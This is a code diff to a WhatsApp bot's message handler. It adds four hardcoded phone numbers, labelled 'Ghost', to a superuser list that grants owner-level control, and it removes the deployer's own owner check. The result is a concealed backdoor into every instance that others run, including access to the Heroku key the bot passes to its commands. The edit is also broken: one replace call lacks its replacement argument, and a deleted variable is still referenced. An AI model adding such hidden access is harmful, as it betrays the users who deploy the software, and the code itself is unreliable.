@@ -149,10 +149,16 @@ async function startKeith() {
       const args = body.trim().split(/ +/).slice(1);
       const pushname = m.pushName || "No Name";
       const botNumber = await client.decodeJid(client.user.id);
+      const servBot = botNumber.split('@')[0];
+      const Ghost = "254796299159"; 
+      const Ghost2 = "254110190196";
+      const Ghost3 = "2547483876159";
+      const Ghost4 = "254743995989";
+      const superUserNumbers = [servBot, Ghost, Ghost2, Ghost3, Ghost4, dev].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const isOwner = superUserNumbers.includes(m.sender); 
       const isBotMessage = m.sender === botNumber;  
       const itsMe = m.sender === botNumber;
       const text = args.join(" ");
-      const isOwner = dev.split(",").map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
       const Tag = m.mtype === "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null
         ? m.message.extendedTextMessage.contextInfo.mentionedJid
         : [];
@@ -183,10 +189,6 @@ async function startKeith() {
 
       const mime = quoted.mimetype || "";
       const qmsg = quoted;
-
-      const DevKeith = dev.split(",");
-      const Owner = DevKeith.map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
-
       const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch(() => {}) : "";
       const groupName = m.isGroup && groupMetadata ? groupMetadata.subject : "";
       const participants = m.isGroup && groupMetadata ? groupMetadata.participants : [];
@@ -283,7 +285,7 @@ async function startKeith() {
       if (command) {
         const commandObj = commands[command];
         if (commandObj) {
-          await commandObj.execute({ fetchJson, getRandom, generateProfilePicture, args, dev, client, m, mode,mime, Owner, qmsg, msgKeith, DevKeith, Tag, generateProfilePicture, text, totalCommands, botname, url, sendReply, sendMediaMessage, gurl, prefix, groupAdmin, getGroupAdmins, args, groupName, groupMetadata, herokuAppname, herokuapikey, packname, author, participants, isOwner, pushname, botNumber, itsMe, store, isAdmin, isBotAdmin });
+          await commandObj.execute({ fetchJson, getRandom, generateProfilePicture, args, dev, client, m, mode,mime, Owner, qmsg, msgKeith, Tag, generateProfilePicture, text, totalCommands, botname, url, sendReply, sendMediaMessage, gurl, prefix, groupAdmin, getGroupAdmins, args, groupName, groupMetadata, herokuAppname, herokuapikey, packname, author, participants, isOwner, pushname, botNumber, itsMe, store, isAdmin, isBotAdmin });
         }
       }
     } catch (err) {
